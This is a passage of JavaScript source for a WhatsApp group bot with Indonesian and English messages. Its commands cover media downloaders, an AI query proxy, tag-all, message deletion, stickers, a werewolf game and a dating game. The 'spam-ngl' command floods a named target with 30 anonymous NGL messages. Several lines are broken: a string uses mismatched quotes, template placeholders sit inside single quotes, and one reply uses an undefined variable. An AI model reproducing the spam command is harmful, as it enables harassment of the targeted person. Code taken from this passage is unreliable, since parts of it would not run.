                    await conn.sendMessage(m.chat, {
                        image: { url: mediaUrl },
                        caption: "Successfully downloaded image from that URL"
                    }, { quoted: m });
                } else if (isVideo) {
                    await conn.sendMessage(m.chat, {
                        video: { url: mediaUrl },
                        caption: "Successfully downloaded video from that URL"
                    }, { quoted: m });
                } else {
                    await conn.sendMessage(m.chat, {
                        text: "Unsupported media type received."
                    }, { quoted: m });
                }
            } catch (error) {
                console.error('Error fetching media type:', error);
                await conn.sendMessage(m.chat, {
                    text: "Error occurred while retrieving media type."
                }, { quoted: m });
            }
        } else {
            await conn.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: m });
        }
      }
      break
      
      case 'fb':
      case 'fbdl':
      case 'facebook':{
          if (isBan) return
          if (!text) return reply(` URL Facebook where is it? contoh ${prefix + command} https://www.facebook.com/share/r/12BFZAtjpS8/?mibextid=qDwCgo`)
          let woii = await fetchJson(`https://api.siputzx.my.id/api/d/facebook?url=${text}`)
          await reaction(m.chat, "⚡")
          let hitam = woii.data;
          let peler = hitam.video;
          let anunya = hitam.userInfo.name
          conn.sendMessage(m.chat, { 
              video: { url: peler }, 
              caption: `source : ${anunya}` }, 
           { quoted: m }
         );
      }
      break
                
      case'ai':
      case'gemini':
      case'openai':
      case'chatgpt':{
        if (isBan) return
        if (!text) return reply(`provide a question? contoh ${prefix + command} siapakah presiden Indonesia sekarang?`)
          let cuki = await fetchJson(`https://loco.web.id/wp-content/uploads/api/v1/bingai.php?q=${text}`)
          await reaction(m.chat, "⚡")
          let mamad = cuki.result.ai_response
          conn.sendMessage(m.chat, { text : mamad }, {quoted:m})
      }
      break
            
      case'tiktok':
      case'tt':{
        if (isBan) return
        if (!text) return reply(`where is the tiktok link? contoh ${prefix + command} https://`);
         let res = await tiktok(text);
          await reaction(m.chat, "⚡")
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await conn.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await conn.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await conn.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await conn.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await conn.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await conn.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
            
      case'pindl':{
        if (isBan) return
        if (!text) return reply(`mana link pinterest nya? contoh ${prefix + command} https://pin.it/1DyLc8cGU`);
        let res = await pindl(text);
          await reaction(m.chat, "⚡")
        let mek = res.data.result;

        if (mek && mek.data) {
            const mediaUrl = mek.data;
            const isImage = mediaUrl.match(/\.(jpeg|jpg|png|gif)$/i);
            const isVideo = mediaUrl.match(/\.(mp4|webm|ogg)$/i);

            if (isImage) {
                await conn.sendMessage(m.chat, {
                    image: { url: mediaUrl },
                    caption: "Successfully downloaded photo using the Pinterest URL"
                }, { quoted: m });
            } else if (isVideo) {
                await conn.sendMessage(m.chat, {
                    video: { url: mediaUrl },
                    caption: "Successfully downloaded video using the Pinterest URL"
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, {
                    text: "Unsupported media type received."
                }, { quoted: m });
            }
        } else {
            await conn.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: m });
        }
      }
      break
            
      case'tagall':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);

        const textMessage = args.join(" ") || "kosong";
        let teks = `pesan tagall :\n> *${textMessage}*\n\n`;

        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        conn.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: m });
      }
      break
            
      case'spam-ngl':{
        if (isBan) return
        if (!text) return reply(`berikan pesan dan username target, contoh ${prefix + command} kyuurzy|woii`)
        let peler = text.split("|")[0]
        let laso = text.split("|")[1]
        for (let j = 0; j < 30; j++) {
        await spamngl(peler, laso)
        }
          await reaction(m.chat, "⚡")
        conn.sendMessage(m.chat, {
            text: `sukses spam NGL ke ${peler} sebanyak 30x` 
          },{quoted:m})
      }
      break
            
        case'brat':{
            if (!isPremium && users.limit < 0) return reply(mess.limited); 
            users.limit -= 1;
         // useLimit(sender, 1);
            if (isBan) return
            if (!text) return reply(`mana text nya? contoh ${prefix + command} apanih cok`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⚡")
            await makeStickerFromUrl(imageUrl, conn, m);
        }
       break
            /*
*
• fixed fitur play by Kyuu
• shared by whyuxD 
*
*/

// Source code case:

case 'play': {
const yts = require('yt-search');
const randomAudioQuality = () => {
    const qualities = [1, 2, 3, 4]; // Indeks kualitas
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
};
const checkQuality = (type, qualityIndex) => {
    const qualities = {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    };
    if (!qualities[type]?.[qualityIndex]) {
        throw new Error(` Kualitas ${type} tidak valid. Pilih salah satu: ${Object.keys(qualities[type]).join(', ')}`);
    }
};
const fetchData = async (url, cdn, body = {}) => {
    const headers = {
        accept: '*/*',
        referer: 'https://ytshorts.savetube.me/',
        origin: 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json',
        authority: `cdn${cdn}.savetube.su`
    };
    try {
        const response = await axios.post(url, body, { headers });
        return response.data;
    } catch (error) {
        console.error(`Error accessing CDN${cdn}: ${error.message}`);
        throw new Error(' Gagal mengambil data dari server.');
    }
};
const randomCdn = () => {
    const availableCdns = [51, 52, 53, 54, 56, 57, 58, 59, 60, 61];
    return availableCdns[Math.floor(Math.random() * availableCdns.length)];
};
const dLink = (cdnUrl, type, quality, videoKey) => {
    return `https://${cdnUrl}/download`;
};
const dl = async (link, qualityIndex, typeIndex) => {
    const type = typeIndex === 1 ? 'audio' : 'video';
    const qualities = { 1: '32', 2: '64', 3: '128', 4: '192' };
    const quality = qualities[qualityIndex];
    if (!type) throw new Error('Tipe tidak valid. Pilih 1 untuk audio atau 2 untuk video');
    checkQuality(type, qualityIndex);
    const cdnNumber = randomCdn();
    const cdnUrl = `cdn${cdnNumber}.savetube.su`;
    const videoInfo = await fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
    const body = {
        downloadType: type,
        quality: quality,
        key: videoInfo.data.key
    };
    const dlRes = await fetchData(dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, body);
    return {
        link: dlRes.data.downloadUrl,
        duration: videoInfo.data.duration,
        durationLabel: videoInfo.data.durationLabel,
        fromCache: videoInfo.data.fromCache,
        id: videoInfo.data.id,
        key: videoInfo.data.key,
        thumbnail: videoInfo.data.thumbnail,
        thumbnail_formats: videoInfo.data.thumbnail_formats,
        title: videoInfo.data.title,
        titleSlug: videoInfo.data.titleSlug,
        videoUrl: videoInfo.data.url,
        quality,
        type
    };
};
if (!text) return reply(`Provide a song name, Example *${command} lucid dreams*`);
try {
  conn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
    let rus = await yts(text);
    if (rus.all.length === 0) return reply("Video tidak ditemukan atau tidak bisa di-download.");
    let data = rus.all.filter(v => v.type === 'video');
    if (data.length === 0) return reply("Tidak ada video yang ditemukan.");
    let res = data[0];
    let thumbUrl = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`;
    let inithumb = await getBuffer(thumbUrl);
    let teks = `*ᴘʟᴀʏɪɴɢ ᴍᴜsɪᴄ ɪɴ ʏᴏᴜᴛᴜʙᴇ*\n\n` +
               `📺 *ᴄʜᴀɴɴᴇʟ* : ${res.author.name}\n` +
               `👀 *ᴠɪᴇᴡᴇʀs* : ${res.views} kali\n` +
               `⏱️ *ᴅᴜʀᴀᴛɪᴏɴ* : ${res.timestamp}\n` +
               `🔗 *ᴜʀʟ ᴘʟᴀʏ* : ${res.url}\n\n` +
               `\n*sDownloading audio....!*`;

    await conn.sendMessage(m.chat, {
        contextInfo: { 
            externalAdReply: { 
                showAdAttribution: true, 
                title: res.title,
                body: new Date().toLocaleString(),													
                mediaType: 2,  
                renderLargerThumbnail: true,
                thumbnail: inithumb,
                mediaUrl: res.url,
                sourceUrl: res.url
            }
        },
        image: { url: thumbUrl },
        text: teks
    }, { quoted: m });
          let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
          let ahh = mbut.result
          let crot = ahh.download.audio
        const nt = await conn.sendMessage(m.chat,{ audio: {url: crot}, mimetype: 'audio/mpeg', ptt: true },{quoted:m});
        await conn.sendMessage(m.chat, { react: { text: '🎶', key: nt.key }})
        
} catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan: ${err.message}`);
}
}
break      
    

    
               
        
    
                
                
      case 'delete':
      case 'd':
      case 'del': {
        if (isBan) return
	    if (!m.quoted) return reply('reply pesan yang mau di hapus')
          await conn.sendMessage(m.chat, {
              delete: {
                  remoteJid: m.chat,
                  id: m.quoted.id,
                  participant: m.quoted.sender
              }
          })
      }
	  break
                
      case 'q':
      case 'quoted': {
        if (isBan) return
          if (!m.quoted) return reply('reply pesannya!!')
          let gwm = await conn.serializeM(await m.getQuotedObj())
          if (!gwm.quoted) return reply('pesan yang anda reply tidak mengandung reply')
          await gwm.quoted.copyNForward(m.chat, true)
      }
      break

      case 'tovn': {
        if (isBan) return
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`);
        if (!quoted) return reply(`Reply video/vn with caption ${prefix + command}`);
        await reaction(m.chat, "⚡")
        await sleep(5000);
        let media = await quoted.download();
        let { toAudio } = require('./lib/converter');
        let audio = await toAudio(media, 'mp4');
        conn.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
      }
        break;
                
			case 'wwpc':
			case 'ww':
			case 'werewolf': {
                if (isBan) return
				let jimp = require("jimp")
				const resize = async (image, width, height) => {
					const read = await jimp.read(image);
					const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
					return data;
				};

				let {
					emoji_role,
					sesi,
					playerOnGame,
					playerOnRoom,
					playerExit,
					dataPlayer,
					dataPlayerById,
					getPlayerById,
					getPlayerById2,
					killWerewolf,
					killww,
					dreamySeer,
					sorcerer,
					protectGuardian,
					roleShuffle,
					roleChanger,
					roleAmount,
					roleGenerator,
					addTimer,
					startGame,
					playerHidup,
					playerMati,
					vote,
					voteResult,
					clearAllVote,
					getWinner,
					win,
					pagi,
					malam,
					skill,
					voteStart,
					voteDone,
					voting,
					run,
					run_vote,
					run_malam,
					runprefixagi
				} = require('./lib/werewolf.js')

				// [ Thumbnail ] 
				let thumb = "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

				const {
					sender,
					chat
				} = m;
				conn.werewolf = conn.werewolf ? conn.werewolf : {};
				const ww = conn.werewolf ? conn.werewolf : {};
				const data = ww[chat];
				const value = args[0];
				const target = args[1];
			    let byId = getPlayerById2(sender, parseInt(target), ww);
				// [ Membuat Room ]
				if (value === "create") {
					if (!m.isGroup) return reply(mess.group)
					if (chat in ww) return reply("group masih dalam sesi permainan");
					if (playerOnGame(sender, ww) === true)
						return reply("kamu masih dalam sesi game");
					ww[chat] = {
						room: chat,
						owner: sender,
						status: false,
						iswin: null,
						cooldown: null,
						day: 0,
						time: "malem",
						player: [],
						dead: [],
						voting: false,
						seer: false,
						guardian: [],
					};
					await reply(`room berhasil dibuat, ketik *${prefix}ww join* untuk bergabung`);

					// [ Join sesi permainan ]
				} else if (value === "join") {
					if (!m.isGroup) return reply(mess.group)
					if (!ww[chat]) return reply("belum ada sesi permainan");
					if (ww[chat].status === true)
						return reply("sesi permainan sudah dimulai");
					if (ww[chat].player.length > 16)
						return reply("maaf jumlah player telah penuh");
					if (playerOnRoom(sender, chat, ww) === true)
						return reply("kamu sudah join dalam room ini");
					if (playerOnGame(sender, ww) === true)
						return reply("kamu masih dalam sesi game");
					let data = {
						id: sender,
						number: ww[chat].player.length + 1,
						sesi: chat,
						status: false,
						role: false,
						effect: [],
						vote: 0,
						isdead: false,
						isvote: false,
					};
					ww[chat].player.push(data);
					let player = [];
					let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
					for (let i = 0; i < ww[chat].player.length; i++) {
						text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
						player.push(ww[chat].player[i].id);
					}
					text += "\njumlah player minimal adalah 5 dan maximal 15";
					conn.sendMessage(
						m.chat, {
							text: text.trim(),
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: `${global.linkch}`,
									mediaUrl: thumb,
								},
								mentionedJid: player,
							},
						}, {
							quoted: m
						}
					);

					// [ Game Play ]
				} else if (value === "start") {
					if (!m.isGroup) return reply(mess.group)
					if (!ww[chat]) return reply("belum ada sesi permainan");
					if (ww[chat].player.length === 0)
						return reply("room belum memiliki player");
					if (ww[chat].player.length < 5)
						return reply("maaf jumlah player belum memenuhi syarat");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("kamu belum join dalam room ini");
					if (ww[chat].cooldown > 0) {
						if (ww[chat].time === "voting") {
							clearAllVote(chat, ww);
							addTimer(chat, ww);
							return await run_vote(conn.chat, ww);
						} else if (ww[chat].time === "malem") {
							clearAllVote(chat, ww);
							addTimer(chat, ww);
							return await run_malam(conn.chat, ww);
						} else if (ww[chat].time === "pagi") {
							clearAllVote(chat, ww);
							addTimer(chat, ww);
							return await runprefixagi(conn.chat, ww);
						}
					}
					if (ww[chat].status === true)
						return reply("sesi permainan telah dimulai");
					if (ww[chat].owner !== sender)
						return reply(
							`Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
						);
					let list1 = "";
					let list2 = "";
					let player = [];
					roleGenerator(chat, ww);
					addTimer(chat, ww);
					startGame(chat, ww);
					for (let i = 0; i < ww[chat].player.length; i++) {
						list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
						player.push(ww[chat].player[i].id);
					}
					for (let i = 0; i < ww[chat].player.length; i++) {
						list2 += '(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].role === "werewolf" || ww[chat].player[i].role === "sorcerer" ? `[${ww[chat].player[i].role}]` : ""}\n';
						player.push(ww[chat].player[i].id);
					}
					for (let i = 0; i < ww[chat].player.length; i++) {
						// [ Werewolf ]
						if (ww[chat].player[i].role === "werewolf") {
							if (ww[chat].player[i].isdead != true) {
								var textt = `Hai ${conn.getName(ww[chat].player[i].id)}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role("werewolf")} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
								await conn.sendMessage(ww[chat].player[i].id, {
									text: textt,
									mentions: player,
								});
							}
							// [ villager ]
						} else if (ww[chat].player[i].role === "warga") {
							if (ww[chat].player[i].isdead != true) {
								let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${conn.getName(ww[chat].player[i].id)} Peran kamu adalah *Warga Desa* ${emoji_role("warga")}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
								await conn.sendMessage(ww[chat].player[i].id, {
									text: texttt,
									mentions: player,
								});
							}

							// [ Penerawangan ]
						} else if (ww[chat].player[i].role === "seer") {
							if (ww[chat].player[i].isdead != true) {
								let texxt = `Hai ${conn.getName(ww[chat].player[i].id)} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role("seer")}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

								await conn.sendMessage(ww[chat].player[i].id, {
									text: texxt,
									mentions: player,
								});
							}

							// [ Guardian ]
						} else if (ww[chat].player[i].role === "guardian") {
							if (ww[chat].player[i].isdead != true) {
								let teext = `Hai ${conn.getName(ww[chat].player[i].id)} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role("guardian")}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;

								await conn.sendMessage(ww[chat].player[i].id, {
									text: teext,
									mentions: player,
								});
							}

							// [ Sorcerer ]
						} else if (ww[chat].player[i].role === "sorcerer") {
							if (ww[chat].player[i].isdead != true) {
								let textu = `Hai ${conn.getName(ww[chat].player[i].id)} Kamu terpilih sebagai Penyihir ${emoji_role("sorcerer")}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

								await conn.sendMessage(ww[chat].player[i].id, {
									text: textu,
									mentions: player,
								});
							}
						}
					}
					await conn.sendMessage(m.chat, {
						text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
						contextInfo: {
							externalAdReply: {
								title: "W E R E W O L F",
								mediaType: 1,
								renderLargerThumbnail: true,
								thumbnail: await resize(thumb, 300, 175),
								sourceUrl: `${global.linkch}`,
								mediaUrl: thumb,
							},
							mentionedJid: player,
						},
					});
					await run(conn.chat, ww);
				} else if (value === "kill") {
					if (dataPlayer(sender, ww).role !== "werewolf")
						return m.reply("peran ini bukan untuk kamu");
                   //  let byId = getPlayerById2(sender, parseInt(target), ww);
					if (byId.db.role === "sorcerer")
						return m.reply("tidak bisa menggunakan skill untuk teman");
					if (playerOnGame(sender, ww) === false)
						return reply("kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("gunakan hanya nomor")
					if (byId.db.isdead === true)
						return reply("player sudah mati")
					if (byId.db.id === sender)
						return reply("tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("player tidak terdaftar")
					reply("berhasil membunuh player " + parseInt(target))
						.then(() => {
							dataPlayer(sender, ww).status = true;
							killWerewolf(sender, parseInt(target), ww);
						});
				} else if (value === "dreamy") {
					if (dataPlayer(sender, ww).role !== "seer")
						return m.reply("peran ini bukan untuk kamu");
					if (playerOnGame(sender, ww) === false)
						return reply("kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("gunakan hanya nomor")
				  //   let byId = getPlayerById2(sender, parseInt(target), ww)
					if (byId.db.isdead === true)
						return reply("player sudah mati")
					if (byId.db.id === sender)
						return reply("tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("player tidak terdaftar")
					let dreamy = dreamySeer(m.sender, parseInt(target), ww);
					reply(`berhasil membuka identitas player ${target} adalah ${dreamy}`)
						.then(() => {
							dataPlayer(sender, ww).status = true;
						});
				} else if (value === "deff") {
					if (dataPlayer(sender, ww).role !== "guardian")
						return m.reply("peran ini bukan untuk kamu");
					if (playerOnGame(sender, ww) === false)
						return reply("kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("gunakan hanya nomor")
				//    let byId = getPlayerById2(sender, parseInt(target), ww)
					if (byId.db.isdead === true)
						return reply("player sudah mati")
					if (byId.db.id === sender)
						return reply("tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("player tidak terdaftar")
					reply(`berhasil melindungi player ${target}`).then(() => {
						protectGuardian(m.sender, parseInt(target), ww);
						dataPlayer(sender, ww).status = true;
					});
				} else if (value === "sorcerer") {
					if (dataPlayer(sender, ww).role !== "sorcerer")
						return m.reply("peran ini bukan untuk kamu");
					if (playerOnGame(sender, ww) === false)
						return reply("kamu tidak dalam sesi game")
					if (dataPlayer(sender, ww).status === true)
						return reply("skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
					if (dataPlayer(sender, ww).isdead === true)
						return reply("kamu sudah mati")
					if (!target || target.length < 1 || target.split('').length > 2)
						return reply(`masukan nomor player \nContoh : \n${prefix + command} kill 1`)
					if (isNaN(target))
						return reply("gunakan hanya nomor")
				//	let byId = getPlayerById2(sender, parseInt(target), ww)
					if (byId.db.isdead === true)
						return reply("player sudah mati")
					if (byId.db.id === sender)
						return reply("tidak bisa menggunakan skill untuk diri sendiri")
					if (byId === false)
						return reply("player tidak terdaftar")
					let sorker = sorcerer(sesi(m.sender), target);
					reply(`berhasil membuka identitas player ${player} adalah ${sorker}`)
						.then(() => {
							dataPlayer(sender, ww).status = true;
						});
				} else if (value === "vote") {
					if (!m.isGroup) return reply(mess.group)
					if (!ww[chat]) return reply("belum ada sesi permainan");
					if (ww[chat].status === false)
						return reply("sesi permainan belum dimulai");
					if (ww[chat].time !== "voting")
						return reply("sesi voting belum dimulai");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("kamu bukan player");
					if (dataPlayer(sender, ww).isdead === true)
						return reply("kamu sudah mati");
					if (!target || target.length < 1)
						return reply("masukan nomor player");
					if (isNaN(target)) return reply("gunakan hanya nomor");
					if (dataPlayer(sender, ww).isvote === true)
						return reply("kamu sudah melakukan voting");
					b = getPlayerById(chat, sender, parseInt(target), ww);
					if (b.db.isdead === true)
						return reply(`player ${target} sudah mati.`);
					if (ww[chat].player.length < parseInt(target))
						return reply("invalid");
					if (getPlayerById(chat, sender, parseInt(target), ww) === false)
						return reply("player tidak terdaftar!");
					vote(chat, parseInt(target), sender, ww);
					return reply("✅ Vote");
				} else if (value == "exit") {
					if (!m.isGroup) return reply(mess.group)
					if (!ww[chat]) return reply("tidak ada sesi permainan");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("kamu tidak dalam sesi permainan");
					if (ww[chat].status === true)
						return reply("permainan sudah dimulai, kamu tidak bisa keluar");
					let exitww = `${sender.split("@")[0]} keluar dari permainan`
					conn.sendMessage(
						m.chat, {
							text: exitww,
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: `${global.linkch}`,
									mediaUrl: thumb,
								},
								mentionedJid: sender,
							},
						}, {
							quoted: m
						}
					);
					playerExit(chat, sender, ww);
				} else if (value === "delete") {
					if (!m.isGroup) return reply(mess.group)
					if (!ww[chat]) return reply("tidak ada sesi permainan");
					if (ww[chat].owner !== sender)
						return reply(`hanya @${ww[chat].owner.split("@")[0]} yang dapat menghapus sesi permainan ini`);
					reply("sesi permainan berhasil dihapus").then(() => {
						delete ww[chat];
					});
				} else if (value === "player") {
					if (!ww[chat]) return reply("tidak ada sesi permainan");
					if (playerOnRoom(sender, chat, ww) === false)
						return reply("kamu tidak dalam sesi permainan");
					if (ww[chat].player.length === 0)
						return reply("sesi permainan belum memiliki player");
					let player = [];
					let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
					for (let i = 0; i < ww[chat].player.length; i++) {
						text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].isdead === true ? `☠️ ${ww[chat].player[i].role}` : ""}\n`;
						player.push(ww[chat].player[i].id);
					}
					conn.sendMessage(
						m.chat, {
							text: text,
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: "https://whatsapp.com/channel/0029VaqhHusLI8YgdtVixE1o",
									mediaUrl: thumb,
								},
								mentionedJid: player,
							},
						}, {
							quoted: m
						}
					);
				} else {
					let text = "\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n";
					text += ` • ww create\n`;
					text += ` • ww join\n`;
					text += ` • ww start\n`;
					text += ` • ww exit\n`;
					text += ` • ww delete\n`;
					text += ` • ww player\n`;
					text += "\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
					conn.sendMessage(
						m.chat, {
							text: text.trim(),
							contextInfo: {
								externalAdReply: {
									title: "W E R E W O L F",
									mediaType: 1,
									renderLargerThumbnail: true,
									thumbnail: await resize(thumb, 300, 175),
									sourceUrl: `${global.linkch}`,
									mediaUrl: thumb,
								},
							},
						}, {
							quoted: m
						}
					);
				}
			}
			break
    
    case 'jadian': {
        if (isBan) return;
        if (!m.isGroup) return reply(mess.group);
        conn.jadian = conn.jadian ? conn.jadian : {};
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        if (!text) return reply(`Tag/reply seseorang, contoh:\n${prefix + command} @628888`)
        if (users === m.sender) return reply("njirr, stress!");
        if (users === botNumber) return reply("njirr, sama bot? edan 😂");

        if (!global.db.data.users[users]) global.db.data.users[users] = { pacar: null };
        if (!global.db.data.users[m.sender]) global.db.data.users[m.sender] = { pacar: null };

        let pasangan = global.db.data.users[users].pacar;
        let pasangan2 = global.db.data.users[m.sender].pacar;

        if (pasangan2 === users) {
            reply(`itu kan pacar lu, njirr`);
        } else if (pasangan) {
            reply(`udaa ada pacarnya njirr!\n\nwoii @${pasangan.split("@")[0]}, ayangmu mau diambil`);
        } else if (pasangan2) {
            reply(`lakh, mau selingkuh?\n\nwoii @${pasangan2.split("@")[0]}, lihat nih, dia mau selingkuh`);
        } else {
                    let ktnmbk = [
                        "ada saat di mana aku nggak suka sendiri. tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.", "aku baru sadar ternyata selama ini kamu kaya! kaya yang aku cari selama ini. kamu mau nggak jadi pacarku?", "aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.", "aku boleh kirim cv ke kamu nggak? soalnya aku mau ngelamar jadi pacar.", "aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?", "aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. maukah kamu menerima cintaku?", "aku ingin bilang sesuatu. udah lama aku suka sama kamu, tapi aku nggak berani ngomong. jadi, kuputuskan untuk wa saja. aku pengin kamu jadi pacarku.", "aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. aku mencintaimu, maukah kamu menjadi pacarku?", "aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. maukah kau jadi pacarku?", "aku mau chat serius sama kamu. selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. kalau nggak keberatan, kamu mau jadi pacarku?", "aku melihatmu dan melihat sisa hidupku di depan mataku.", "aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.", "aku menyukaimu dari dulu. kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. akan sempurna jika kamu yang menjadi spesial di hati.", "aku naksir banget sama kamu. maukah kamu jadi milikku?", "aku nggak ada ngabarin kamu bukan karena aku nggak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat 